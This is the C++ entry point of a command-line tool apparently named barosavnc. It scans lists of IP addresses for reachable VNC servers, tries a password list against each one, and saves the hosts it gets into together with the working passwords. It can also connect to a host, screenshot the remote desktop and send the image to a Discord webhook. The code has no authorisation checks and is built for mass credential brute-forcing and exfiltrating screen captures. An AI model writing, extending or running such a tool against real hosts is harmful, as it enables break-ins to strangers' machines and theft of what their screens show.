#include "../include/cli.hpp"
#include "../include/vnc.hpp"
#include "../include/wire.hpp"
#include "../include/util.hpp"
#include <filesystem>
#include <fstream>
#include <iostream>

int main(int argc, char** argv) {
	barosavnc::cli cmd{&argc, argv};
	cmd.usages.emplace_back("-C", "connect to VNC. e.g. (-C 127.0.0.1), (-C 192.168.0.1:5902)");
	cmd.usages.emplace_back("-pw", "specify password to connect with");
	cmd.usages.emplace_back("-ss", "screenshot VNC screen and send to DISCORD_WEBHOOK_URL. used with -C");
	cmd.usages.emplace_back("-F", "filter a list of ips for currently online VNC servers. e.g. (-F ips.json)");
	cmd.usages.emplace_back("-fmt", "choose format of -F input. e.g. (-fmt lines) use with -F");
	cmd.usages.emplace_back("-j", "specify amount of threads to use when filtering VNC (default=3) use with -F");
	cmd.usages.emplace_back("-pwlist", "specify passwords list to try on each ip e.g. (-pwlist passwords.txt) use with -F");
	cmd.usages.emplace_back("-ct", "specify connection timeout in seconds. use with -F and -C");
	cmd.usages.emplace_back("-log", "flag to display libvncserver logs");

	if (!cmd.parse()) return 1;

	if (cmd.options.contains("-F")) {
		// FIXME: ratelimit the amount ofrequests we do on servers
		const auto input_path = cmd.option("-F");
		const auto passwords_path = cmd.option_or("-pwlist", "");
		const auto input_format = cmd.option_or("-fmt", "json");
		const auto connect_timeout = cmd.option_or<unsigned int>("-ct", 5);
		const auto max_threads = cmd.option_or<unsigned int>("-j", 3);
		const auto max_job_lines = max_threads;

		if (passwords_path.empty()) {
			fmt::print("{}fatal{} -pwlist is required\n", barosavnc::term::RED, barosavnc::term::RESET);
			return 1;
		}

		std::vector<barosavnc::filter_ip> servers;
		barosavnc::vnc_servers_filter filter{
			.input_file=input_path,
			.passwords_file=passwords_path,
			.format_option=input_format,
			.connect_timeout=connect_timeout,
			.max_threads=max_threads,
			.max_job_lines=max_job_lines,
			.client_logging=false, // probably not during multithreading. enable at your own risk
			.out=servers,
		};

		filter();
		if (filter.failed) {
			fmt::print("{}fatal{} failed to filter servers\n", barosavnc::term::RED, barosavnc::term::RESET);
			return 0;
		}

		if (servers.empty()) {
			fmt::print("no alive servers from \"{}\" to save ...\n", input_path);
			return 0;
		}

		time_t ts = time(nullptr);
		const auto output_file_path = std::format("barosavnc_filtered_{}.txt", ts);
		std::ofstream servers_file{output_file_path};
		std::ostream* out = &servers_file;

		if (!servers_file.is_open()) {
			fmt::print("{}failed to open output file \"{}\" ... outputting here instead{}\n", 
					barosavnc::term::RED, output_file_path, barosavnc::term::RESET);
			out = &std::cout;
		} else {
			fmt::print("{}\n", output_file_path);
		}

		for (const auto& server : servers) {
			*out << server.host << ':' << server.port;
			if (!server.password.empty()) {
				*out << '|' << server.password;
			}
			*out << '\n';
		}

		
	} else if (cmd.options.contains("-C")) {
		auto port = 5900;
		std::string host = cmd.option("-C");
		const auto host_parts = barosavnc::str::regex_split(host.data(), ":");
		if (host_parts.size() == 2) {
			host = host_parts[0];
			port = barosavnc::safe_stoi<int>(host_parts[1]).value_or(5900);
		}

		const auto pword = cmd.option_or("-pw", "");
		const auto connect_timeout = cmd.option_or<unsigned int>("-ct", 5);
		const auto should_screenshot = cmd.flags.contains("-ss");
		const auto client_logging = cmd.flags.contains("-log");

		if (should_screenshot && barosavnc::env_quick("DISCORD_WEBHOOK_URL").empty()) {
			using namespace barosavnc;
			fmt::print("!!! {}DISCORD_WEBHOOK_URL{} is missing from your .env{}\n", term::YELLOW, term::RED, term::RESET);
			fmt::print("your .env file");
			if (!fs::exists(".env")) {
				fmt::print(" does not exist ...\n");
			} else {
				fmt::print(" doesn't contain a valid key value for it\n");
				fmt::print(".env example: \n");
				fmt::print("DISCORD_WEBHOOK_URL=https://<webhook url>\n");
			}
			return 1;
		}

		fmt::print("{}connecting to vnc{} {}:{}\n", barosavnc::term::YELLOW, barosavnc::term::RESET, host, port);
		barosavnc::vnc conn{host, pword, port, connect_timeout, client_logging, should_screenshot};

		if (conn.alive) {
			fmt::print("{}connected{}\n", barosavnc::term::GREEN, barosavnc::term::RESET);
			while (HandleRFBServerMessage(conn.client)) { 
				// TODO: properly listen for when we should stop?
			}
		} else {
			fmt::print("{}connection failed{}\n", barosavnc::term::RED, barosavnc::term::RESET);
		}

	} else {
		cmd.display_usages();
		return 1;
	}

	return 0;
}
